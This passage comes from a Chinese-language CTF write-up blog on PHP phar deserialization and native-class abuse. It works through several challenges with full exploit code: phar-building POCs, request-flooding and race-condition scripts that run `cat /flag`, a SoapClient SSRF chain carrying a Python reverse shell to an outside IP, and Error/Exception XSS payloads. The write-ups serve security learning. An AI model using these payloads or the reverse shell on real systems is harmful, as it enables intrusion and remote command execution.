\\$FLAG();\u0026#34; . \u0026#34;}\u0026#34;); $_GET[\u0026#34;lucky\u0026#34;](); } } function check_session() { global $SECRET; $data = $_COOKIE[\u0026#34;session-data\u0026#34;]; list($data, $hmac) = explode(\u0026#34;-----\u0026#34;, $data, 2); if (!isset($data, $hmac) || !is_string($data) || !is_string($hmac)) { die(\u0026#34;Bye\u0026#34;); } if (!hash_equals(hash_hmac(\u0026#34;sha1\u0026#34;, $data, $SECRET), $hmac)) { die(\u0026#34;Bye Bye\u0026#34;); } $data = unserialize($data); if (!isset($data-\u0026gt;avatar)) { die(\u0026#34;Bye Bye Bye\u0026#34;); } return $data-\u0026gt;avatar; } function upload($path) { $data = file_get_contents($_GET[\u0026#34;url\u0026#34;] . \u0026#34;/avatar.gif\u0026#34;); if (substr($data, 0, 6) !== \u0026#34;GIF89a\u0026#34;) { die(\u0026#34;Fuck off\u0026#34;); } file_put_contents($path . \u0026#34;/avatar.gif\u0026#34;, $data); die(\u0026#34;Upload OK\u0026#34;); } function show($path) { if (!file_exists($path . \u0026#34;/avatar.gif\u0026#34;)) { $path = \u0026#34;/var/www/html\u0026#34;; } header(\u0026#34;Content-Type: image/gif\u0026#34;); die(file_get_contents($path . \u0026#34;/avatar.gif\u0026#34;)); } $mode = $_GET[\u0026#34;m\u0026#34;]; if ($mode == \u0026#34;upload\u0026#34;) { upload(check_session()); } else if ($mode == \u0026#34;show\u0026#34;) { show(check_session()); } else { echo \u0026#34;IP:\u0026#34;.$_SERVER[\u0026#34;REMOTE_ADDR\u0026#34;]; echo \u0026#34;Sandbox:\u0026#34;.\u0026#34;/var/www/data/\u0026#34; . md5(\u0026#34;orange\u0026#34; . $_SERVER[\u0026#34;REMOTE_ADDR\u0026#34;]); highlight_file(__FILE__); } 这里的admin类有eval函数可以拿flag，但是random变量我们得不到，样也就无法获得 flag，所以我们要通过匿名类的名字来调用 flag 生成函数。\n我们看看create_function函数的内核源码（ php-src/Zend/zend_builtin_functions.c:1901 ）\n可以看到匿名函数的名字类似于 \\0lambda_%d ，其中%d为数字，取决于进程中匿名函数的个数，但是我们每访问一次题目，就会生成一个匿名函数，这样匿名函数的名字就不好控制。这里，我们便要引入 apache-prefork 模型\n当用户请求过大时，超过 apache 默认设定的阀值时，就会启动新的线程来处理请求，此时在新的线程中，匿名函数的名字又会从1开始递增，这样我们就容易猜测匿名函数的名字了。\nApache-prefork模型 Apache-prefork模型(默认模型)在接受请求后会如何处理,首先Apache会默认生成5个child server去等待用户连接, 默认最高可生成256个child server, 这时候如果用户大量请求, Apache就会在处理完MaxRequestsPerChild个tcp连接后kill掉这个进程,开启一个新进程处理请求(这里猜测Orange大大应该修改了默认的0,因为0为永不kill掉子进程 这样就无法fork出新进程了) 在这个新进程里面匿名函数就会是从1开始的了\n然后data变量可控，上面一个data需要secret的值，不然不能通过hash_equals函数的校验\n下面一个上传gif的功能且data同样可控，可以打phar反序列化，要求url传入，我们要在vps上面传入一个phar文件，接着用题目的上传功能进行反序列化\nPOC:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 \u0026lt;?php class User { public $avatar; function __construct() { $this-\u0026gt;avatar = \u0026#39;avatar.gif\u0026#39;; } } class Admin extends User {} $o = new Admin(); $filename = \u0026#39;avatar.phar\u0026#39;; file_exists($filename) ? unlink($filename) : null; $phar=new Phar($filename); $phar-\u0026gt;startBuffering(); $phar-\u0026gt;setStub(\u0026#34;GIF89a\u0026lt;?php __HALT_COMPILER(); ?\u0026gt;\u0026#34;); $phar-\u0026gt;setMetadata($o); $phar-\u0026gt;addFromString(\u0026#34;foo.txt\u0026#34;,\u0026#34;bar\u0026#34;); $phar-\u0026gt;stopBuffering(); ?\u0026gt; 上面的类可以简化为\n1 2 3 class Admin { public $avatar=\u0026#39;xxxx\u0026#39;; } 生成后改后缀为gif上传到vps上面\n然后传参\n1 ?m=upload\u0026amp;url=http://47.122.53.248 后面会自动拼接/avatar.gif\n接着，我们需要通过大量请求，使 apache 重新开启一个新的线程，下面用脚本发送请求\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 import requests import socket import time from multiprocessing.dummy import Pool as ThreadPool try: requests.packages.urllib3.disable_warnings() except: pass def run(i): while 1: HOST = \u0026#39;http://f74e1cf5-bfea-43ab-b245-a74909602705.node5.buuoj.cn\u0026#39; PORT = 81 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((HOST, PORT)) s.sendall(\u0026#39;GET /avatar.gif HTTP/1.1\\nHost: http://f74e1cf5-bfea-43ab-b245-a74909602705.node5.buuoj.cn\\nConnection: Keep-Alive\\n\\n\u0026#39;) # s.close() print (\u0026#39;ok\u0026#39;) time.sleep(0.5) i = 8 pool = ThreadPool( i ) result = pool.map_async( run, range(i) ).get(0xffff) 最后再访问\n1 ?m=upload\u0026amp;url=phar:///var/www/data/1feb13d43096d650c715402976792464/\u0026amp;lucky=%00lambda_1 最后一个参数是因为匿名函数被调用新线程从1开始\n这里可能上面的是我host和port有问题\n我们直接批量访问上面的这个url也是一样的效果\n1 2 3 4 5 6 7 8 9 10 11 12 import requests url = \u0026#39;http://f74e1cf5-bfea-43ab-b245-a74909602705.node5.buuoj.cn:81/?m=upload\u0026amp;url=phar:///var/www/data/1feb13d43096d650c715402976792464/\u0026amp;lucky=%00lambda_1\u0026#39; header = { \u0026#39;User-Agent\u0026#39;: \u0026#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0\u0026#39;, \u0026#39;Cookie\u0026#39;: \u0026#39;session-data=O%3A4%3A%22User%22%3A1%3A%7Bs%3A6%3A%22avatar%22%3Bs%3A46%3A%22%2Fvar%2Fwww%2Fdata%2F1feb13d43096d650c715402976792464%22%3B%7D-----827f6bcfbfcfb178de59d8468e37c44c8e7be4b1\u0026#39; } while True: r =requests.get(url,headers=header) if \u0026#39;flag\u0026#39; in r.text: print(r.text) 例题3：[DASCTF2022.07赋能赛]Ez to getflag 非预期，直接读/flag就出来了\n预期解\n抓包看到file.php,由于前面看出来可以任意文件读取，我们直接读file.php\n1 2 3 4 5 6 7 8 \u0026lt;?php error_reporting(0); session_start(); require_once(\u0026#39;class.php\u0026#39;); $filename = $_GET[\u0026#39;f\u0026#39;]; $show = new Show($filename); $show-\u0026gt;show(); ?\u0026gt; 看到包含了class.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 \u0026lt;?php class Upload { public $f; public $fname; public $fsize; function __construct(){ $this-\u0026gt;f = $_FILES; } function savefile() { $fname = md5($this-\u0026gt;f[\u0026#34;file\u0026#34;][\u0026#34;name\u0026#34;]).\u0026#34;.png\u0026#34;; if(file_exists(\u0026#39;./upload/\u0026#39;.$fname)) { @unlink(\u0026#39;./upload/\u0026#39;.$fname); } move_uploaded_file($this-\u0026gt;f[\u0026#34;file\u0026#34;][\u0026#34;tmp_name\u0026#34;],\u0026#34;upload/\u0026#34; . $fname); echo \u0026#34;upload success! :D\u0026#34;; } function __toString(){ $cont = $this-\u0026gt;fname; $size = $this-\u0026gt;fsize; echo $cont-\u0026gt;$size; return \u0026#39;this_is_upload\u0026#39;; } function uploadfile() { if($this-\u0026gt;file_check()) { $this-\u0026gt;savefile(); } } function file_check() { $allowed_types = array(\u0026#34;png\u0026#34;); $temp = explode(\u0026#34;.\u0026#34;,$this-\u0026gt;f[\u0026#34;file\u0026#34;][\u0026#34;name\u0026#34;]); $extension = end($temp); if(empty($extension)) { echo \u0026#34;what are you uploaded? :0\u0026#34;; return false; } else{ if(in_array($extension,$allowed_types)) { $filter = \u0026#39;/\u0026lt;\\?php|php|exec|passthru|popen|proc_open|shell_exec|system|phpinfo|assert|chroot|getcwd|scandir|delete|rmdir|rename|chgrp|chmod|chown|copy|mkdir|file|file_get_contents|fputs|fwrite|dir/i\u0026#39;; $f = file_get_contents($this-\u0026gt;f[\u0026#34;file\u0026#34;][\u0026#34;tmp_name\u0026#34;]); if(preg_match_all($filter,$f)){ echo \u0026#39;what are you doing!! :C\u0026#39;; return false; } return true; } else { echo \u0026#39;png onlyyy! XP\u0026#39;; return false; } } } } class Show{ public $source; public function __construct($fname) { $this-\u0026gt;source = $fname; } public function show() { if(preg_match(\u0026#39;/http|https|file:|php:|gopher|dict|\\.\\./i\u0026#39;,$this-\u0026gt;source)) { die(\u0026#39;illegal fname :P\u0026#39;); } else { echo file_get_contents($this-\u0026gt;source); $src = \u0026#34;data:jpg;base64,\u0026#34;.base64_encode(file_get_contents($this-\u0026gt;source)); echo \u0026#34;\u0026lt;img src={$src} /\u0026gt;\u0026#34;; } } function __get($name) { $this-\u0026gt;ok($name); } public function __call($name, $arguments) { if(end($arguments)==\u0026#39;phpinfo\u0026#39;){ phpinfo(); }else{ $this-\u0026gt;backdoor(end($arguments)); } return $name; } public function backdoor($door){ include($door); echo \u0026#34;hacked!!\u0026#34;; } public function __wakeup() { if(preg_match(\u0026#34;/http|https|file:|gopher|dict|\\.\\./i\u0026#34;, $this-\u0026gt;source)) { die(\u0026#34;illegal fname XD\u0026#34;); } } } class Test{ public $str; public function __construct(){ $this-\u0026gt;str=\u0026#34;It\u0026#39;s works\u0026#34;; } public function __destruct() { echo $this-\u0026gt;str; } } ?\u0026gt; 开始构造链子\n1 Test::__destruct() ---》 Upload::__toString() ---》 Show::__get() ---》 Show::__call 关于__toString这里\n1 2 3 4 5 6 function __toString(){ $cont = $this-\u0026gt;fname; $size = $this-\u0026gt;fsize; echo $cont-\u0026gt;$size; return \u0026#39;this_is_upload\u0026#39;; } 这里$cont-\u0026gt;$size意思并不是对象$cont里面的size变量，而是读取对象$cont里面名为$size的变量\n这里最终是要触发show类里面的backdoor函数，让它包含我们的命令\n所以我们给fname赋值为new show()而fsize就是backdoor函数接收的参数,只要不填show类已有的参数，就会触发__get方法\n先填phpinfo测试\nexp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 \u0026lt;?php class Upload { public $fname; public $fsize; function __toString(){ $cont = $this-\u0026gt;fname; $size = $this-\u0026gt;fsize; echo $cont-\u0026gt;$size; return \u0026#39;this_is_upload\u0026#39;; } } class Show{ function __get($name) { $this-\u0026gt;ok($name); } public function __call($name, $arguments) { if(end($arguments)==\u0026#39;phpinfo\u0026#39;){ phpinfo(); }else{ $this-\u0026gt;backdoor(end($arguments)); } return $name; } } class Test{ public $str; public function __destruct() { echo $this-\u0026gt;str; } } $o=new Test(); $o-\u0026gt;str=new Upload(); $o-\u0026gt;str-\u0026gt;fname=new Show(); $o-\u0026gt;str-\u0026gt;fsize=\u0026#39;phpinfo\u0026#39;; @unlink(\u0026#34;phar.phar\u0026#34;); $phar = new Phar(\u0026#34;phar.phar\u0026#34;); $phar-\u0026gt;startBuffering(); //设置stub $phar-\u0026gt;setStub(\u0026#39;GIF89a\u0026#39;.\u0026#39;\u0026lt;?php __HALT_COMPILER();?\u0026gt;\u0026#39;); //将自定义的meta-data存入manifest，这个是利用的重点 $phar-\u0026gt;setMetadata($o); //添加要压缩的文件，这个文件可以不存在，但这句语句不能少 $phar-\u0026gt;addFromString(\u0026#34;test.txt\u0026#34;, \u0026#34;test\u0026#34;); //签名自动计算 $phar-\u0026gt;stopBuffering(); ?\u0026gt; 然后使用gzip压缩phar.phar（这里利用了一个特性：gzip压缩后不影响phar://的利用）\n因为Upload类中的file_check方法会对文件内容进行检查，gzip压缩后就可以绕过\n当然也可以用文章前面部分提及的compress.bzip://或compress.bzip2://，这里没有限制\n1 想要利用压缩 phar，需要启用 zlib 和 bzip2 扩展。 此外，想要利用 OpenSSL 签名，需要开启 OpenSSL 扩展才能使用。 直接在linux终端用gzip命令,然后改名为png上传\n然后传参\n1 /file.php?f=phar://upload/ed54ee58cd01e120e27939fe4a64fa92.png\u0026amp;_=1742392548518 后面这个是phar.png的MD5值\n弹出phpinfo界面后，可以直接将exp的fsize改成/flag\n官方wp是利用条件竞争打session文件包含\n先把上面的exp改为'/tmp/sess_chaaa'\n然后脚本条件竞争\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 import sys,threading,requests,re from hashlib import md5 HOST = sys.argv[1] PORT = sys.argv[2] flag=\u0026#39;\u0026#39; check=True # 触发phar文件反序列化去包含session上传进度文件 def include(fileurl,s): global check,flag while check: fname = md5(\u0026#39;shell.png\u0026#39;.encode(\u0026#39;utf-8\u0026#39;)).hexdigest()+\u0026#39;.png\u0026#39; params = { \u0026#39;f\u0026#39;: \u0026#39;phar://upload/\u0026#39;+fname } res = s.get(url=fileurl, params=params) if \u0026#34;working\u0026#34; in res.text: flag = re.findall(\u0026#39;upload_progress_working(DASCTF{.+})\u0026#39;,res.text)[0] check = False # 利用session.upload.progress写入临时文件 def sess_upload(url,s): global check while check: data={ \u0026#39;PHP_SESSION_UPLOAD_PROGRESS\u0026#39;: \u0026#34;\u0026lt;?php echo \u0026#39;working\u0026#39;,system(\u0026#39;cat /flag\u0026#39;);?\u0026gt;\\\u0026#34;); ?\u0026gt;\u0026#34; } cookies={ \u0026#39;PHPSESSID\u0026#39;: \u0026#39;chaaa\u0026#39; } files={ \u0026#39;file\u0026#39;: (\u0026#39;chaaa.png\u0026#39;, b\u0026#39;cha\u0026#39;*300) } s.post(url=url,data=data,cookies=cookies,files=files) def exp(ip, port): url = \u0026#34;http://\u0026#34;+ip+\u0026#34;:\u0026#34;+port+\u0026#34;/\u0026#34; fileurl = url+\u0026#39;file.php\u0026#39; uploadurl = url+\u0026#39;upload.php\u0026#39; num = threading.active_count() # 上传phar文件 file = {\u0026#39;file\u0026#39;: open(\u0026#39;./shell.png\u0026#39;, \u0026#39;rb\u0026#39;)} ret = requests.post(url=uploadurl, files=file) # 文件上传条件竞争获取flag event=threading.Event() s1 = requests.Session() s2 = requests.Session() for i in range(1,10): threading.Thread(target=sess_upload,args=(uploadurl,s1)).start() for i in range(1,10): threading.Thread(target=include,args=(fileurl,s2,)).start() event.set() while threading.active_count() != num: pass if __name__ == \u0026#39;__main__\u0026#39;: exp(HOST, PORT) print(flag) 这里有另一种办法\n先上传一个base64编码的php文件\n1 2 PD9waHAgc3lzdGVtKCdjYXQgL2ZsYWcnKTs/Pg== //\u0026lt;?php system(\u0026#39;cat /flag\u0026#39;);?\u0026gt; 改为1.png，前下的fsize改为\n1 php://filter/read=convert.base64-decode/resource=upload/4a47a0db6e60853dedfcfdf08a5ca249.png 然后传参\n1 file.php?f=phar://upload/ed54ee58cd01e120e27939fe4a64fa92.png 就拿到flag了\n导致phar触发的其他地方(sql) Postgres 1 2 3 \u0026lt;?php $pdo = new PDO(sprintf(\u0026#34;pgsql:host=%s;dbname=%s;user=%s;password=%s\u0026#34;, \u0026#34;127.0.0.1\u0026#34;, \u0026#34;test\u0026#34;, \u0026#34;root\u0026#34;, \u0026#34;root\u0026#34;)); @$pdo-\u0026gt;pgsqlCopyFromFile(\u0026#39;aa\u0026#39;, \u0026#39;phar://test.phar/aa\u0026#39;); 当然，pgsqlCopyToFile和pg_trace同样也是能使用的，只是它们需要开启phar的写功能。\nMySQL LOAD DATA LOCAL INFILE也会触发phar造成反序列化，下面有mysql服务伪造结合phar反序列化的题目\n例题：[SUCTF 2019]Upload Labs buu把admin.php里面的destruct方法的内容改了,但是__destruct方法不用mysql服务伪造就可以执行，就造成非预期，想要预期解只能把源码改为用__wakeup方法，打两次phar反序列化\nadmin.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 \u0026lt;?php include \u0026#39;config.php\u0026#39;; class Ad{ public $cmd; public $clazz; public $func1; public $func2; public $func3; public $instance; public $arg1; public $arg2; public $arg3; function __construct($cmd, $clazz, $func1, $func2, $func3, $arg1, $arg2, $arg3){ $this-\u0026gt;cmd = $cmd; $this-\u0026gt;clazz = $clazz; $this-\u0026gt;func1 = $func1; $this-\u0026gt;func2 = $func2; $this-\u0026gt;func3 = $func3; $this-\u0026gt;arg1 = $arg1; $this-\u0026gt;arg2 = $arg2; $this-\u0026gt;arg3 = $arg3; } function check(){ $reflect = new ReflectionClass($this-\u0026gt;clazz); $this-\u0026gt;instance = $reflect-\u0026gt;newInstanceArgs(); $reflectionMethod = new ReflectionMethod($this-\u0026gt;clazz, $this-\u0026gt;func1); $reflectionMethod-\u0026gt;invoke($this-\u0026gt;instance, $this-\u0026gt;arg1); $reflectionMethod = new ReflectionMethod($this-\u0026gt;clazz, $this-\u0026gt;func2); $reflectionMethod-\u0026gt;invoke($this-\u0026gt;instance, $this-\u0026gt;arg2); $reflectionMethod = new ReflectionMethod($this-\u0026gt;clazz, $this-\u0026gt;func3); $reflectionMethod-\u0026gt;invoke($this-\u0026gt;instance, $this-\u0026gt;arg3); } function __destruct(){ system($this-\u0026gt;cmd); } } if($_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;] == \u0026#39;127.0.0.1\u0026#39;){ if(isset($_POST[\u0026#39;admin\u0026#39;])){ $cmd = $_POST[\u0026#39;cmd\u0026#39;]; $clazz = $_POST[\u0026#39;clazz\u0026#39;]; $func1 = $_POST[\u0026#39;func1\u0026#39;]; $func2 = $_POST[\u0026#39;func2\u0026#39;]; $func3 = $_POST[\u0026#39;func3\u0026#39;]; $arg1 = $_POST[\u0026#39;arg1\u0026#39;]; $arg2 = $_POST[\u0026#39;arg2\u0026#39;]; $arg2 = $_POST[\u0026#39;arg3\u0026#39;]; $admin = new Ad($cmd, $clazz, $func1, $func2, $func3, $arg1, $arg2, $arg3); $admin-\u0026gt;check(); } } else { echo \u0026#34;You r not admin!\u0026#34;; } class.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 \u0026lt;?php include \u0026#39;config.php\u0026#39;; class File{ public $file_name; public $type; public $func = \u0026#34;Check\u0026#34;; function __construct($file_name){ $this-\u0026gt;file_name = $file_name; } function __wakeup(){ $class = new ReflectionClass($this-\u0026gt;func); $a = $class-\u0026gt;newInstanceArgs($this-\u0026gt;file_name); $a-\u0026gt;check(); } function getMIME(){ $finfo = finfo_open(FILEINFO_MIME_TYPE); $this-\u0026gt;type = finfo_file($finfo, $this-\u0026gt;file_name); finfo_close($finfo); } function __toString(){ return $this-\u0026gt;type; } } class Check{ public $file_name; function __construct($file_name){ $this-\u0026gt;file_name = $file_name; } function check(){ $data = file_get_contents($this-\u0026gt;file_name); if (mb_strpos($data, \u0026#34;\u0026lt;?\u0026#34;) !== FALSE) { die(\u0026#34;\u0026amp;lt;? in contents!\u0026#34;); } } } config.php里面libxml_disable_entity_loader(true);不能xxe了\nfunc.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 \u0026lt;?php include \u0026#39;class.php\u0026#39;; if (isset($_POST[\u0026#34;submit\u0026#34;]) \u0026amp;\u0026amp; isset($_POST[\u0026#34;url\u0026#34;])) { if(preg_match(\u0026#39;/^(ftp|zlib|data|glob|phar|ssh2|compress.bzip2|compress.zlib|rar|ogg|expect)(.|\\\\s)*|(.|\\\\s)*(file|data|\\.\\.)(.|\\\\s)*/i\u0026#39;,$_POST[\u0026#39;url\u0026#39;])){ die(\u0026#34;Go away!\u0026#34;); }else{ $file_path = $_POST[\u0026#39;url\u0026#39;]; $file = new File($file_path); $file-\u0026gt;getMIME(); echo \u0026#34;\u0026lt;p\u0026gt;Your file type is \u0026#39;$file\u0026#39; \u0026lt;/p\u0026gt;\u0026#34;; } } ?\u0026gt; index.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 \u0026lt;?php include \u0026#39;class.php\u0026#39;; $userdir = \u0026#34;upload/\u0026#34; . md5($_SERVER[\u0026#34;REMOTE_ADDR\u0026#34;]); if (!file_exists($userdir)) { mkdir($userdir, 0777, true); } if (isset($_POST[\u0026#34;upload\u0026#34;])) { // 允许上传的图片后缀 $allowedExts = array(\u0026#34;gif\u0026#34;, \u0026#34;jpeg\u0026#34;, \u0026#34;jpg\u0026#34;, \u0026#34;png\u0026#34;); $tmp_name = $_FILES[\u0026#34;file\u0026#34;][\u0026#34;tmp_name\u0026#34;]; $file_name = $_FILES[\u0026#34;file\u0026#34;][\u0026#34;name\u0026#34;]; $temp = explode(\u0026#34;.\u0026#34;, $file_name); $extension = end($temp); if ((($_FILES[\u0026#34;file\u0026#34;][\u0026#34;type\u0026#34;] == \u0026#34;image/gif\u0026#34;) || ($_FILES[\u0026#34;file\u0026#34;][\u0026#34;type\u0026#34;] == \u0026#34;image/jpeg\u0026#34;) || ($_FILES[\u0026#34;file\u0026#34;][\u0026#34;type\u0026#34;] == \u0026#34;image/png\u0026#34;)) \u0026amp;\u0026amp; ($_FILES[\u0026#34;file\u0026#34;][\u0026#34;size\u0026#34;] \u0026lt; 204800) // 小于 200 kb \u0026amp;\u0026amp; in_array($extension, $allowedExts) ) { $c = new Check($tmp_name); $c-\u0026gt;check(); if ($_FILES[\u0026#34;file\u0026#34;][\u0026#34;error\u0026#34;] \u0026gt; 0) { echo \u0026#34;错误：: \u0026#34; . $_FILES[\u0026#34;file\u0026#34;][\u0026#34;error\u0026#34;] . \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; die(); } else { move_uploaded_file($tmp_name, $userdir . \u0026#34;/\u0026#34; . md5($file_name) . \u0026#34;.\u0026#34; . $extension); echo \u0026#34;文件存储在: \u0026#34; . $userdir . \u0026#34;/\u0026#34; . md5($file_name) . \u0026#34;.\u0026#34; . $extension; } } else { echo \u0026#34;非法的文件格式\u0026#34;; } } Ad类里面有\n1 2 3 if($_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;] == \u0026#39;127.0.0.1\u0026#39;){ if(isset($_POST[\u0026#39;admin\u0026#39;])){ $cmd = $_POST[\u0026#39;cmd\u0026#39;]; 想到打ssrf\n先看上面的check函数逻辑\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 function check(){ $reflect = new ReflectionClass($this-\u0026gt;clazz); $this-\u0026gt;instance = $reflect-\u0026gt;newInstanceArgs(); $reflectionMethod = new ReflectionMethod($this-\u0026gt;clazz, $this-\u0026gt;func1); $reflectionMethod-\u0026gt;invoke($this-\u0026gt;instance, $this-\u0026gt;arg1); $reflectionMethod = new ReflectionMethod($this-\u0026gt;clazz, $this-\u0026gt;func2); $reflectionMethod-\u0026gt;invoke($this-\u0026gt;instance, $this-\u0026gt;arg2); $reflectionMethod = new ReflectionMethod($this-\u0026gt;clazz, $this-\u0026gt;func3); $reflectionMethod-\u0026gt;invoke($this-\u0026gt;instance, $this-\u0026gt;arg3); } 在这里通过反射来调用类中的方法，调用后大概是这样\n1 2 3 4 5 6 7 8 9 10 11 Class clazz{ function func1($arg1){ ... } function func2($arg2){ ... } function func3($arg3){ ... } } 我们可以寻找一个存在单参数方法的原生类，这里用到了SplDoublyLinkedList::unshift\n1 clazz=SplDoublyLinkedList\u0026amp;func1=unshift\u0026amp;func2=unshift\u0026amp;func3=unshift\u0026amp;arg1=1\u0026amp;arg2=2\u0026amp;arg3=3 或者用SplStack类和它的push方法\n1 clazz=SplStack\u0026amp;func1=push\u0026amp;func2=push\u0026amp;func3=push\u0026amp;arg1=123456\u0026amp;arg2=123456\u0026amp;arg3=123456 查看func.php，里面调用了getMIME()跟进看到finfo_file函数可以phar反序列化，同时要绕过func.php里面的正则，要用php://filter伪协议\n在class.php里面有个__wakeup()在我们上面反序列化后触发\n1 2 3 4 5 function __wakeup(){ $class = new ReflectionClass($this-\u0026gt;func); $a = $class-\u0026gt;newInstanceArgs($this-\u0026gt;file_name); $a-\u0026gt;check(); } 由于要打ssrf，想到原生类SoapClient，而且下面$a-\u0026gt;check();会触发SoapClient内置的__call方法\nexp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 \u0026lt;?php class File{ public $file_name; public $func=\u0026#34;SoapClient\u0026#34;; public function __construct(){ $payload=\u0026#39;admin=1\u0026amp;cmd=python -c \\\u0026#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;47.122.53.248\u0026#34;,2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\u0026#34;/bin/sh\u0026#34;,\u0026#34;-i\u0026#34;]);\\\u0026#39;\u0026amp;clazz=SplStack\u0026amp;func1=push\u0026amp;func2=push\u0026amp;func3=push\u0026amp;arg1=123456\u0026amp;arg2=123456\u0026amp;arg3=123456\u0026#39;; $this-\u0026gt;file_name=[null,array(\u0026#39;location\u0026#39;=\u0026gt;\u0026#39;http://127.0.0.1/admin.php\u0026#39;,\u0026#39;user_agent\u0026#39;=\u0026gt;\u0026#34;xxx\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nContent-Length: \u0026#34;.strlen($payload).\u0026#34;\\r\\n\\r\\n\u0026#34;.$payload,\u0026#39;uri\u0026#39;=\u0026gt;\u0026#39;abc\u0026#39;)]; } } $a=new File(); @unlink(\u0026#34;1.phar\u0026#34;); $phar=new Phar(\u0026#34;1.phar\u0026#34;); $phar-\u0026gt;startBuffering(); $phar-\u0026gt;setStub(\u0026#39;GIF89a\u0026#39;.\u0026#39;\u0026lt;script language=\u0026#34;php\u0026#34;\u0026gt;__HALT_COMPILER();\u0026lt;/script\u0026gt;\u0026#39;); $phar-\u0026gt;setMetadata($a); $phar-\u0026gt;addFromString(\u0026#34;test.txt\u0026#34;, \u0026#34;test\u0026#34;); $phar-\u0026gt;stopBuffering(); ?\u0026gt; 改名为1.gif上传，然后在func.php下面传入下面payload触发phar反序列化弹shell\n1 php://filter/resource=phar://upload/fc3f8d0d99ccdde85c8cfc624fe94c32/b5e9b4f86ce43ca65bd79c894c4a924c.gif ","date":"2025-03-17T00:00:00Z","image":"https://0d000721999.github.io/p/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1.png","permalink":"https://0d000721999.github.io/p/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","title":"Phar反序列化"},{"content":"PHP原生类利用 参考：文章 - PHP 原生类的利用小结 - 先知社区\nPHP内置类的遍历 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 \u0026lt;?php $classes = get_declared_classes(); foreach ($classes as $class) { $methods = get_class_methods($class); foreach ($methods as $method) { if (in_array($method, array( \u0026#39;__destruct\u0026#39;, \u0026#39;__toString\u0026#39;, \u0026#39;__wakeup\u0026#39;, \u0026#39;__call\u0026#39;, \u0026#39;__callStatic\u0026#39;, \u0026#39;__get\u0026#39;, \u0026#39;__set\u0026#39;, \u0026#39;__isset\u0026#39;, \u0026#39;__unset\u0026#39;, \u0026#39;__invoke\u0026#39;, \u0026#39;__set_state\u0026#39; // 可以根据题目环境将指定的方法添加进来, 来遍历存在指定方法的原生类 ))) { print $class . \u0026#39;::\u0026#39; . $method . \u0026#34;\\n\u0026#34;; } } } 使用 Error/Exception 内置类进行 XSS Error内置类 适用于php7版本 在开启报错的情况下 Error类是php的一个内置类，用于自动自定义一个Error，在php7的环境下可能会造成一个xss漏洞，因为它内置有一个 __toString() 的方法，常用于PHP 反序列化中。如果有个POP链走到一半就走不通了，不如尝试利用这个来做一个xss，其实我看到的还是有好一些cms会选择直接使用 echo 的写法，当 PHP 对象被当作一个字符串输出或使用时候（如echo的时候）会触发__toString 方法，这是一种挖洞的新思路。\n下面演示如何使用 Error 内置类来构造 XSS。\n测试代码\n1 2 3 4 \u0026lt;?php $a = unserialize($_GET[\u0026#39;cmd\u0026#39;]); echo $a; ?\u0026gt; （这里可以看到是一个反序列化函数，但是没有让我们进行反序列化的类啊，这就遇到了一个反序列化但没有POP链的情况，所以只能找到PHP内置类来进行反序列化）\nPOC:\n1 2 3 4 5 \u0026lt;?php $a = new Error(\u0026#34;\u0026lt;script\u0026gt;alert(\u0026#39;xss\u0026#39;)\u0026lt;/script\u0026gt;\u0026#34;); $b = serialize($a); echo urlencode($b); ?\u0026gt; 成功弹窗\nException内置类 适用于php5、7版本 开启报错的情况下 测试代码跟前面一样\nPOC把Error改成Exception就行了\n例题：[BJDCTF 2nd]xss之光 上来git泄露\ngithack拿到源码\n1 2 3 \u0026lt;?php $a = $_GET[\u0026#39;yds_is_so_beautiful\u0026#39;]; echo unserialize($a); 仅看到一个反序列化函数并没有给出需要反序列化的类，这就遇到了一个反序列化但没有POP链的情况，所以只能找到PHP内置类来进行反序列化。又发现有个echo，没得跑了，就是我们刚才演示的利用Error或Exception内置类进行XSS，但是查看一下题目的环境发现是PHP 5，所以我们要使用Exception类。\n由于此题是xss，所以只要xss执行window.open()就能把flag带出来，所以POC如下：\n1 2 3 4 \u0026lt;?php $poc = new 